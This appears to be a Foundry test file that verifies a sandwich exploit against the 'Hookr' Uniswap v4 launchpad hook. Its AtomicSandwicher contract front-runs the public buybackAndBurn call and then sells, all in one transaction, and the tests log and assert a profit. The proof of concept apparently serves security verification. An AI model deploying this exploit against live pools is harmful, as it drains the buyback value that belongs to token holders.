// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;

import {Test} from "forge-std/Test.sol";
import {console2} from "forge-std/console2.sol";
import {IPoolManager} from "@uniswap/v4-core/src/interfaces/IPoolManager.sol";
import {IHooks} from "@uniswap/v4-core/src/interfaces/IHooks.sol";
import {PoolKey} from "@uniswap/v4-core/src/types/PoolKey.sol";
import {PoolId} from "@uniswap/v4-core/src/types/PoolId.sol";
import {Currency} from "@uniswap/v4-core/src/types/Currency.sol";
import {BalanceDelta} from "@uniswap/v4-core/src/types/BalanceDelta.sol";
import {SwapParams} from "@uniswap/v4-core/src/types/PoolOperation.sol";
import {StateLibrary} from "@uniswap/v4-core/src/libraries/StateLibrary.sol";
import {PoolSwapTest} from "@uniswap/v4-core/src/test/PoolSwapTest.sol";

import {HookrLaunchpad} from "../src/HookrLaunchpad.sol";
import {HookrHook} from "../src/HookrHook.sol";
import {HookrToken} from "../src/HookrToken.sol";
import {HookMiner} from "./utils/HookMiner.sol";

/// Attacker contract: proves the whole sandwich fits in ONE transaction with no mempool
/// visibility and no revert risk (no need to front-run anybody else's tx).
contract AtomicSandwicher {
    PoolSwapTest public immutable router;
    HookrHook public immutable hook;

    constructor(PoolSwapTest r, HookrHook h) {
        router = r;
        hook = h;
    }

    receive() external payable {}

    function run(PoolKey memory key, uint256 frontRun) external payable returns (int256 pnl) {
        uint256 before = address(this).balance + msg.value - msg.value; // balance before spending
        before = address(this).balance;
        address token = Currency.unwrap(key.currency1);

        router.swap{value: frontRun}(
            key,
            SwapParams({zeroForOne: true, amountSpecified: -int256(frontRun), sqrtPriceLimitX96: 4295128740}),
            PoolSwapTest.TestSettings({takeClaims: false, settleUsingBurn: false}),
            ""
        );

        hook.buybackAndBurn(key);

        uint256 got = HookrToken(token).balanceOf(address(this));
        HookrToken(token).approve(address(router), got);
        router.swap(
            key,
            SwapParams({
                zeroForOne: false,
                amountSpecified: -int256(got),
                sqrtPriceLimitX96: 1461446703485210103287273052203988822378723970341
            }),
            PoolSwapTest.TestSettings({takeClaims: false, settleUsingBurn: false}),
            ""
        );

        pnl = int256(address(this).balance) - int256(before);
    }
}

contract ZZSandwichVerify is Test {
    using StateLibrary for IPoolManager;

    IPoolManager constant PM = IPoolManager(0x8366a39CC670B4001A1121B8F6A443A643e40951);
    uint160 constant HOOK_FLAGS = uint160((1 << 13) | (1 << 7) | (1 << 3));
    uint96 constant TARGET = 0.01 ether;

    HookrLaunchpad pad;
    HookrHook hook;
    PoolSwapTest router;

    address creator = address(0xC0FFEE);
    address alice = address(0xA11CE);
    address bob = address(0xB0B);
    address attacker = address(0xBADBAD);

    function setUp() public {
        vm.createSelectFork("robinhood");
        pad = new HookrLaunchpad(PM);
        bytes memory creation = abi.encodePacked(type(HookrHook).creationCode, abi.encode(PM, address(pad)));
        (address predicted, bytes32 salt) = HookMiner.find(address(this), HOOK_FLAGS, creation);
        hook = new HookrHook{salt: salt}(PM, address(pad));
        assertEq(address(hook), predicted);
        pad.setHook(hook);
        router = new PoolSwapTest(PM);

        vm.deal(creator, 1000 ether);
        vm.deal(alice, 1000 ether);
        vm.deal(bob, 1000 ether);
        vm.deal(attacker, 1000 ether);
    }

    function _launch(HookrLaunchpad.HookParams memory p, string memory sym)
        internal
        returns (address token, PoolKey memory key)
    {
        HookrLaunchpad.LaunchArgs memory a;
        a.name = sym;
        a.symbol = sym;
        a.targetRaiseWei = TARGET;
        a.blueprintId = 0;
        a.custom = p;
        vm.prank(creator);
        token = pad.launch{value: pad.creationFeeWei()}(a);
        vm.prank(alice);
        pad.buy{value: 0.02 ether}(token, 0);
        key = PoolKey({
            currency0: Currency.wrap(address(0)),
            currency1: Currency.wrap(token),
            fee: 0x800000,
            tickSpacing: 60,
            hooks: IHooks(address(hook))
        });
    }

    function _buy(address who, PoolKey memory key, uint256 ethIn) internal {
        vm.prank(who);
        router.swap{value: ethIn}(
            key,
            SwapParams({zeroForOne: true, amountSpecified: -int256(ethIn), sqrtPriceLimitX96: 4295128740}),
            PoolSwapTest.TestSettings({takeClaims: false, settleUsingBurn: false}),
            ""
        );
    }

    function _sell(address who, PoolKey memory key, address token, uint256 amt) internal {
        vm.startPrank(who);
        HookrToken(token).approve(address(router), amt);
        router.swap(
            key,
            SwapParams({
                zeroForOne: false,
                amountSpecified: -int256(amt),
                sqrtPriceLimitX96: 1461446703485210103287273052203988822378723970341
            }),
            PoolSwapTest.TestSettings({takeClaims: false, settleUsingBurn: false}),
            ""
        );
        vm.stopPrank();
    }

    function _params(bool surge) internal pure returns (HookrLaunchpad.HookParams memory p) {
        p = HookrLaunchpad.HookParams({
            guardBlocks: 0,
            maxBuyBps: 0,
            snipeTaxPips: 0,
            baseFeePips: 3000, // 0.3% — UI default
            maxFeePips: surge ? uint24(30_000) : uint24(3000), // 3% ceiling — UI default
            surgeSens: surge ? 5 : 0, // UI default
            burnBps: 100, // 1% — UI default
            burnTriggerWei: 1,
            lpBps: 0,
            potBps: 0,
            potOdds: 0,
            potMinBuyWei: 0
        });
    }

    // ------------------------------------------------------------------------------
    // CONTROL: is the "profit" actually caused by the buyback, or would a plain
    // buy->sell round trip in this pool make money anyway?
    // ------------------------------------------------------------------------------
    function test_control_plainRoundTripNoBuyback() public {
        uint256[4] memory sizes = [uint256(0.005 ether), 0.02 ether, 0.1 ether, 0.3 ether];
        for (uint256 s = 0; s < sizes.length; s++) {
            uint256 outer = vm.snapshotState();
            HookrLaunchpad.HookParams memory p = _params(false); // surge OFF, same as the probe
            (address token, PoolKey memory key) = _launch(p, "CTRL");
            for (uint256 i = 0; i < 5; i++) {
                _buy(bob, key, 0.01 ether);
            }
            uint256 ethBefore = attacker.balance;
            _buy(attacker, key, sizes[s]);
            uint256 got = HookrToken(token).balanceOf(attacker);
            _sell(attacker, key, token, got);
            console2.log("front-run:", sizes[s]);
            console2.log("  round-trip PnL WITHOUT the buyback in the middle:");
            console2.logInt(int256(attacker.balance) - int256(ethBefore));
            vm.revertToState(outer);
        }
    }

    // ------------------------------------------------------------------------------
    // The probe's config, but with the surge block ON — i.e. the only configuration a
    // burn-block pool can actually be launched with through the builder UI (a stack
    // with a burn block and no fee block compiles maxFeePips = 0 and cannot graduate).
    // ------------------------------------------------------------------------------
    function test_realisticSurgeOn_sandwichPnl() public {
        uint256[6] memory sizes =
            [uint256(0.001 ether), 0.005 ether, 0.01 ether, 0.02 ether, 0.1 ether, 0.3 ether];
        for (uint256 s = 0; s < sizes.length; s++) {
            uint256 outer = vm.snapshotState();
            HookrLaunchpad.HookParams memory p = _params(true); // surge ON (UI default 0.3% -> 3%)
            (address token, PoolKey memory key) = _launch(p, "SURG");
            PoolId id = key.toId();
            for (uint256 i = 0; i < 5; i++) {
                _buy(bob, key, 0.01 ether);
            }

            uint256 snap = vm.snapshotState();
            hook.buybackAndBurn(key);
            uint256 honest = hook.totalBurnedTokens(id);
            vm.revertToState(snap);

            uint256 ethBefore = attacker.balance;
            _buy(attacker, key, sizes[s]);
            uint256 got = HookrToken(token).balanceOf(attacker);
            hook.buybackAndBurn(key);
            _sell(attacker, key, token, got);
            console2.log("front-run:", sizes[s]);
            console2.log("  PnL (surge on):");
            console2.logInt(int256(attacker.balance) - int256(ethBefore));
            console2.log("  burn honest    :", honest);
            console2.log("  burn sandwiched:", hook.totalBurnedTokens(id));
            vm.revertToState(outer);
        }
    }

    // ------------------------------------------------------------------------------
    // Realistic vault size: burnTriggerWei = 0.02 ETH (the builder's default), reached
    // by real buy volume. Surge on. Does the sandwich pay?
    // ------------------------------------------------------------------------------
    function test_realisticTrigger_sandwichPnl() public {
        uint256[5] memory sizes = [uint256(0.01 ether), 0.05 ether, 0.2 ether, 1 ether, 3 ether];
        for (uint256 s = 0; s < sizes.length; s++) {
            uint256 outer = vm.snapshotState();
            HookrLaunchpad.HookParams memory p = _params(true);
            p.burnTriggerWei = 0.02 ether; // builder default
            (address token, PoolKey memory key) = _launch(p, "TRIG");
            PoolId id = key.toId();
            // 2 ETH of buy volume at a 1% cut fills the 0.02 ETH trigger exactly.
            for (uint256 i = 0; i < 20; i++) {
                _buy(bob, key, 0.1 ether);
            }
            uint256 vault = hook.burnVaultWei(id);
            (uint160 sp,,,) = PM.getSlot0(id);
            uint128 liq = PM.getLiquidity(id);
            uint256 ethReserve = (uint256(liq) << 96) / sp;
            console2.log("vault:", vault, " eth-side depth:", ethReserve);

            uint256 snap = vm.snapshotState();
            hook.buybackAndBurn(key);
            uint256 honest = hook.totalBurnedTokens(id);
            vm.revertToState(snap);

            uint256 ethBefore = attacker.balance;
            _buy(attacker, key, sizes[s]);
            uint256 got = HookrToken(token).balanceOf(attacker);
            hook.buybackAndBurn(key);
            _sell(attacker, key, token, got);
            console2.log("front-run:", sizes[s]);
            console2.log("  PnL:");
            console2.logInt(int256(attacker.balance) - int256(ethBefore));
            console2.log("  burn honest    :", honest);
            console2.log("  burn sandwiched:", hook.totalBurnedTokens(id));
            vm.revertToState(outer);
        }
    }

    // ------------------------------------------------------------------------------
    // Atomicity: no mempool visibility needed. One contract, one transaction.
    // ------------------------------------------------------------------------------
    function test_atomicSingleTransaction() public {
        HookrLaunchpad.HookParams memory p = _params(false);
        (, PoolKey memory key) = _launch(p, "ATOM");
        for (uint256 i = 0; i < 5; i++) {
            _buy(bob, key, 0.01 ether);
        }
        AtomicSandwicher a = new AtomicSandwicher(router, hook);
        vm.deal(address(a), 10 ether);
        int256 pnl = a.run(key, 0.005 ether);
        console2.log("atomic one-tx sandwich PnL:");
        console2.logInt(pnl);
        assertGt(pnl, 0, "atomic single-tx sandwich is profitable");
    }
}
